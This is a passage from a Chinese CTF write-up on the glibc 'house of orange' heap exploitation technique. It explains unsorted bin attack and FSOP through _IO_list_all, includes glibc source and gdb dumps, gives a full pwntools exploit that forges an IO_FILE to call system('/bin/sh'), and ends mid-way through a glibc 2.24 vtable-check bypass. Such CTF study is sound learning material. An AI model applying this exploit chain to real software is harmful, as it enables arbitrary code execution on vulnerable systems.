chunk，在它的bk处存入_IO_list_all-0x10的地址（这个注意，unsorted bin attack的bk覆写一定是在之前并没有add的堆块，即被free掉的或者和这题的覆写一样的）</p><p><code>FSOP</code>，通过伪造_IO_list_all中的节点来实现对FILE链表的控制以实现利用目的。通常来说一般是直接利用任意写的漏洞修改_IO_list_all直接指向可控的地址。</p></blockquote><p>其中，unsorted bin attack和FSOP都是在最后一步malloc（0x10）的时候才实现的</p><h4 id="关于IO-FILE"><a href="#关于IO-FILE" class="headerlink" title="关于IO FILE"></a>关于IO FILE</h4><p>后面两步都会与一个叫<code>_IO_FILE_plus</code>的结构体有关系，那我们就先来看一下这个结构体吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE_plus</span><br><span class="line">&#123;</span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  const struct _IO_jump_t *vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而指向这个结构体的指针叫做<font color="red">_IO_list_all</font>，它存在于符号表内（即可以libc.sym[‘_IO_list_all’]操作），定义如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extern struct _IO_FILE_plus *_IO_list_all;</span><br></pre></td></tr></table></figure><p>_IO_list_all一般指向的都是_IO_2_1_stderr<br>正常的程序中存在<code>stderr</code>、<code>sdout</code>以及<code>stdin</code>三个<code>IO FILE</code>，他们之间的关系呢大概是这样的</p><p><img src="/2020/03/10/house-of-orange/1.png" alt></p><p>就是</p><blockquote><p>_IO_list_all-&gt;_IO_2_1_stderr</p><p>_IO_2_1_stderr-&gt;_IO_2_1_stdout</p><p>_IO_2_1_stdout-&gt;_IO_2_1_stdin</p></blockquote><p>既然它牵扯到了IO FILE结构体里的东西，那我们就再倒回来说说这个结构体吧</p><p>_IO_FILE_plus结构体的第一part IO FILE的file结构（用gdb来看吧）</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *((struct _IO_FILE_plus *) <span class="number">0x7f733765e540</span>)</span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72540026</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0x7f733765e620</span> &lt;_IO_2_1_stdout_&gt;, </span><br><span class="line">    _fileno = <span class="number">2</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">-1</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">'\000'</span>, </span><br><span class="line">    _shortbuf = <span class="string">""</span>, </span><br><span class="line">    _lock = <span class="number">0x7f733765f770</span> &lt;_IO_stdfile_2_lock&gt;, </span><br><span class="line">    _offset = <span class="number">-1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x7f733765d660</span> &lt;_IO_wide_data_2&gt;, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">0</span>, </span><br><span class="line">    _unused2 = <span class="string">'\000'</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x7f733765c6e0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>chain指向的是下一个IO FILE结构体</p><p>而vtable呢是一个虚表指针，指向的是<code>_IO_file_jumps</code></p><p>刚好_IO_FILE_plus的第二part就是这个虚表了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在我们将IO_list_all链接进unsorted bin之后，unsortedbin的结构被破坏（IO_read_ptr=0,即size=0），再进行malloc就会触发malloc printerr报错</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">           || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">                                &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">         malloc_printerr (<span class="string">"malloc(): memory corruption"</span>);</span><br></pre></td></tr></table></figure><p>触发之后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">函数大致调用链</span><br><span class="line">mallloc_printerr-&gt; __libc_message—&gt;<span class="built_in">abort</span>-&gt;flush-&gt;_IO_flush_all_lock-&gt;_IO_OVERFLOW</span><br><span class="line">而_IO_OVERFLOW最后会调用vtable表中的__overflow 函数</span><br><span class="line"><span class="comment">//define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure><p>_IO_flush_all_lockp源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all_lockp (int do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  int result = 0;</span><br><span class="line">  FILE *fp;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line">#endif</span><br><span class="line">  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      if (do_lock)</span><br><span class="line">        _IO_flockfile (fp);</span><br><span class="line">      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)/*一些检查，需要绕过*/</span><br><span class="line">           || (_IO_vtable_offset (fp) == 0</span><br><span class="line">               &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))/*也可以绕过这个*/</span><br><span class="line">           )</span><br><span class="line">          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)/*遍历_IO_list_all ，选出_IO_FILE作为_IO_OVERFLOW的参数，执行函数*/</span><br><span class="line">        result = EOF;</span><br><span class="line">      if (do_lock)</span><br><span class="line">        _IO_funlockfile (fp);</span><br><span class="line">      run_fp = NULL;</span><br><span class="line">    &#125;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (0);</span><br><span class="line">#endif</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要想调用到IO_overflow,就要满足if的绕过条件，即：</p><blockquote><p>((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</p><p>或者是</p><p>_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以将write_base-&gt;0,write_ptr-&gt;0x1,满足write_base&lt;write_ptr</span><br><span class="line">也可以改_wide_data为原old_top-0x10就好了，fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base，在wide_data的io结构里，writer_base变成了之前的read_end,即我们构造的fd，writer_ptr变成了read_base,即我们构造的bk（io_list_all-0x10),只要满足前者的等式就好了</span><br></pre></td></tr></table></figure><p>第一种会相对来说方便一点</p><p>然后把vtable指向自己，再把system填入IO_OVERFLEW，执行的时候就可以getshell了</p><h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./houseoforange'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./houseoforange'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name,price,color)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice : "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"name :"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Name :"</span>)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">"Orange:"</span>)</span><br><span class="line">p.sendline(str(price))</span><br><span class="line">p.recvuntil(<span class="string">"Orange:"</span>)</span><br><span class="line">p.sendline(str(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upgrade</span><span class="params">(size,name,price,color)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice : "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"name :"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Name:"</span>)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">"Orange:"</span>)</span><br><span class="line">p.sendline(str(price))</span><br><span class="line">p.recvuntil(<span class="string">"Orange:"</span>)</span><br><span class="line">p.sendline(str(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">see</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice : "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'aaaa'</span>,<span class="number">32</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">upgrade(<span class="number">0x40</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xfa1</span>),<span class="number">32</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xfb0</span>,<span class="string">'aaaa'</span>,<span class="number">32</span>,<span class="number">1</span>) <span class="comment">#in unsorted bin list</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">'b'</span>*<span class="number">8</span>,<span class="number">32</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">see()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">1640</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(main_arena)</span><br><span class="line">libc_base = main_arena - <span class="number">0x3c4b20</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">upgrade(<span class="number">0x400</span>,<span class="string">'b'</span>*<span class="number">0x10</span>,<span class="number">32</span>,<span class="number">1</span>)</span><br><span class="line">see()</span><br><span class="line">p.recvuntil(<span class="string">'b'</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_IO_list_all = libc.symbols[<span class="string">'_IO_list_all'</span>] + libc_base</span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>] + libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment">#满足_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line"><span class="comment"># pay = 'a'*0x400</span></span><br><span class="line"><span class="comment"># pay += p64(0) + p64(0x21) + 'a'*0x10</span></span><br><span class="line"><span class="comment"># io_file = '/bin/sh\x00' + p64(0x61) #'/bin/sh'是IO FILE，最后会作为IO_overflower的参数  victim-&gt;size=0</span></span><br><span class="line"><span class="comment"># io_file += p64(0) +p64(_IO_list_all-0x10) #unsorted bin attack  把list_all写进unsorted bin队列里面，即list_all-&gt;构造的堆块处(not io_stderr)</span></span><br><span class="line"><span class="comment"># io_file += p64(0) + p64(1) #绕检查_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line"><span class="comment"># io_file += p64(0) * 18</span></span><br><span class="line"><span class="comment"># io_file += p64(0) * 3</span></span><br><span class="line"><span class="comment"># io_file += p64(heap_addr+0x508) #vtable   -&gt;指向自己</span></span><br><span class="line"><span class="comment"># pay += io_file + p64(0)*2</span></span><br><span class="line"><span class="comment"># pay += p64(system)</span></span><br><span class="line"><span class="comment"># upgrade(0x800,pay,32,1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span></span><br><span class="line">payload=<span class="string">"x"</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p32(<span class="number">666</span>)+p32(<span class="number">0xddaa</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_chunk=<span class="string">'/bin/sh\x00'</span>+p64(<span class="number">0x61</span>)<span class="comment">#why ? io_file?</span></span><br><span class="line">fake_chunk+=p64(<span class="number">0</span>)+p64(_IO_list_all<span class="number">-0x10</span>)</span><br><span class="line">fake_chunk=fake_chunk.ljust(<span class="number">0xa0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_chunk+=p64(heap_addr+<span class="number">0x420</span>) <span class="comment"># wide_data -&gt; read_end  然后就会调用虚表+0x18偏移处的函数了</span></span><br><span class="line">fake_chunk=fake_chunk.ljust(<span class="number">0xc0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_chunk+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=fake_chunk</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(heap_addr+<span class="number">0x528</span>) </span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment"># vtable</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">upgrade(<span class="number">0x800</span>,payload,<span class="number">32</span>,<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unsortbin.bk也被改写成了&amp;IO_list_all-0x10，所以此时的victim-&gt;size=0那么不会通过校验，进入malloc_printerr，触发异常。</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice : "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>) <span class="comment">#如果再分配一个chunk，就会触发malloc_printerr，会遍历IO_llist_all，最终调用 IO_overflow函数</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="关于构造chunk的size为什么是0x60："><a href="#关于构造chunk的size为什么是0x60：" class="headerlink" title="关于构造chunk的size为什么是0x60："></a>关于构造chunk的size为什么是0x60：</h4><blockquote><p>首先victim-&gt;size=0（IO FILE的伪unsorted bin结构里，size=0）会触发malloc printer（就是那个malloc错误）这个时候就会去调用IO_list_all那个系列的函数</p><p>在IO_FILE结构体中，偏移0x60的字段是struct _IO_marker *_markers，偏移0x68的字段是struct _IO_FILE *_chain。而这两个的值恰恰是old_top的起始地址。</p></blockquote><p>　　原来改为0x60是为了将<code>old_top</code>加入<code>smallbin[4]</code>，而<code>smallbin[4]的fd和bk指针</code>恰好对应于<code>IO_FILE</code>结构体中的<code>_markers</code>和<code>_chain</code>字段。就能跳转至我们的<code>old_top</code>了</p><h4 id="实现FSOP的调试"><a href="#实现FSOP的调试" class="headerlink" title="实现FSOP的调试"></a>实现FSOP的调试</h4><p>在malloc最后一个堆块前我们去gdb里在<code>_int_malloc</code>看一下调用</p><p>出现error的字样时，chunk被写进<code>smallbin[4]</code></p><p><img src="/2020/03/10/house-of-orange/2.png" alt></p><p>此时的<code>IO_FILE</code>进入<code>main_arena</code></p><p><img src="/2020/03/10/house-of-orange/3.png" alt></p><p>此时chain的值为<code>fack_chunk</code>的地址，即<code>old_top</code></p><p><img src="/2020/03/10/house-of-orange/4.png" alt><br>(这里是第二种绕过方式的截图)</p><p>old_top里面chain为0，则往vtable执行</p><h3 id="house-of-orange在glibc2-24下的利用"><a href="#house-of-orange在glibc2-24下的利用" class="headerlink" title="house of orange在glibc2.24下的利用"></a>house of orange在glibc2.24下的利用</h3><p>glibc2.24开始引入vtable 的检测函数—— <code>IO_validate_vtable</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *</span></span><br><span class="line"><span class="class"><span class="title">IO_validate_vtable</span> (<span class="title">const</span> <span class="title">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *ptr = (<span class="keyword">const</span> <span class="keyword">char</span> *) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vtable需要满足的条件：</p><blockquote><p>在 <strong>stop_</strong>IO_vtables 和 <strong>start_</strong>libc_IO_vtables 之间</p></blockquote><p>而我们伪造的vtable通常不满足这个条件，但是可以找到 ==<strong>IO_str_jumps== 符合条件。（接下来就分析利用</strong>IO_str_jumps的绕过）</p><p>__IO_str_jumps 结构如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们利用<code>_IO_str_finish</code>进行接下来的绕过和利用</p><p>其源码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void _IO_str_finish (FILE *fp, int dummy)</span><br><span class="line">&#123;</span><br><span class="line">  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    // call qword ptr 